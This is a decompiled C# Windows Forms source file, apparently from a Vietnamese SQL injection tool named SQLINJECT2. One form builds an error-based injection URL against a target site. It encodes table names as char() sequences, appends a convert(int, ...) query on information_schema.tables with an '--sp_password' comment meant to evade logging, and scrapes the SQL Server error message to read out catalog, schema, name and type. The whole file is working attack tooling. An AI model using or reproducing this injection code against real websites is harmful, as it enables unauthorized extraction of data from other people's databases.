using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace SQLINJECT2;

public class TableInfoForm : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private Label label6;

	private Label label7;

	private Label label8;

	private Button button1;

	private string weblink;

	private string thongbao1 = "value '";

	private string thongbao2 = "' to";

	private string thongbao1_2 = "value &apos;";

	private string thongbao2_2 = "&apos; to";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Expected O, but got Unknown
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Expected O, but got Unknown
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		label8 = new Label();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(96, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Table_catalog :");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label2).set_Location(new Point(12, 42));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(97, 13));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Table_schema :");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label3).set_Location(new Point(12, 76));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(84, 13));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Table_name :");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label4).set_Location(new Point(12, 109));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(78, 13));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Table_type :");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Location(new Point(116, 8));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(57, 13));
		((Control)label5).set_TabIndex(4);
		((Control)label5).set_Text("Loading ...");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Location(new Point(116, 42));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(57, 13));
		((Control)label6).set_TabIndex(5);
		((Control)label6).set_Text("Loading ...");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Location(new Point(116, 76));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(57, 13));
		((Control)label7).set_TabIndex(6);
		((Control)label7).set_Text("Loading ...");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Location(new Point(116, 109));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(57, 13));
		((Control)label8).set_TabIndex(7);
		((Control)label8).set_Text("Loading ...");
		((Control)button1).set_Location(new Point(119, 169));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(8);
		((Control)button1).set_Text("Close");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((ScrollableControl)this).set_AutoScroll(true);
		((Form)this).set_ClientSize(new Size(333, 204));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Name("TableInfoForm");
		((Control)this).set_Text("Thông tin bảng");
		((Form)this).add_Load((EventHandler)TableInfoForm_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public TableInfoForm()
	{
		InitializeComponent();
	}

	private bool GetHtmlSource(out string responseString, Uri requestURI)
	{
		HttpWebResponse httpWebResponse = null;
		WebProxy proxy = null;
		Stream stream = null;
		MemoryStream memoryStream = null;
		MemoryStream memoryStream2 = null;
		bool result = false;
		responseString = "";
		requestURI = null;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(weblink);
			httpWebRequest.Accept = "*/*";
			httpWebRequest.Headers.Add("Accept-Language", "en-us");
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3";
			httpWebRequest.Method = "GET";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.Proxy = proxy;
			httpWebRequest.Timeout = (int)new TimeSpan(0, 0, 60).TotalMilliseconds;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				_ = httpWebResponse.CharacterSet;
				stream = httpWebResponse.GetResponseStream();
				result = true;
			}
			catch (WebException ex)
			{
				result = false;
				if (ex.Response == null)
				{
					stream = null;
					responseString = "<html><body>" + ex.Message + "</body></html>";
					return result;
				}
				stream = ex.Response!.GetResponseStream();
			}
			finally
			{
				requestURI = httpWebRequest.RequestUri;
			}
			if (stream != null)
			{
				memoryStream = new MemoryStream();
				memoryStream2 = new MemoryStream();
				Utilities.CopyStream(stream, memoryStream);
				memoryStream.Position = 0L;
				Utilities.CopyStream(memoryStream, memoryStream2);
				responseString = Utilities.GetStreamHTMLData(memoryStream, null, supportSeek: true);
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
		finally
		{
			stream?.Close();
			memoryStream?.Close();
			memoryStream2?.Close();
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void TableInfoForm_Load(object sender, EventArgs e)
	{
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		Encoding aSCII = Encoding.ASCII;
		byte[] bytes = aSCII.GetBytes(MainForm.table);
		byte[] array = bytes;
		foreach (byte b in array)
		{
			text = text + "char(" + b + ")%2b";
		}
		text = text.Substring(0, Convert.ToInt32(text.Length) - 3);
		Uri requestURI = null;
		string responseString = "";
		weblink = MainForm.address1 + " and 1=convert(int,(select table_catalog%2bchar(124)%2bTable_schema%2bchar(124)%2btable_name%2bchar(124)%2btable_type from " + MainForm.database + ".information_schema.tables where table_name = " + text + "))--sp_password" + MainForm.address1;
		GetHtmlSource(out responseString, requestURI);
		int num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 7;
		int length = Convert.ToInt32(responseString.IndexOf(thongbao2)) - num;
		if (num == 6)
		{
			num = Convert.ToInt32(responseString.IndexOf(thongbao1_2)) + 12;
			length = Convert.ToInt32(responseString.IndexOf(thongbao2_2)) - num;
		}
		try
		{
			string[] array2 = responseString.Substring(num, length).Split(new char[1] { '|' });
			((Control)label5).set_Text(array2[0]);
			((Control)label6).set_Text(array2[1]);
			((Control)label7).set_Text(array2[2]);
			((Control)label8).set_Text(array2[3]);
		}
		catch (Exception)
		{
			MessageBox.Show("Không thể lấy được dữ liệu");
		}
	}
}
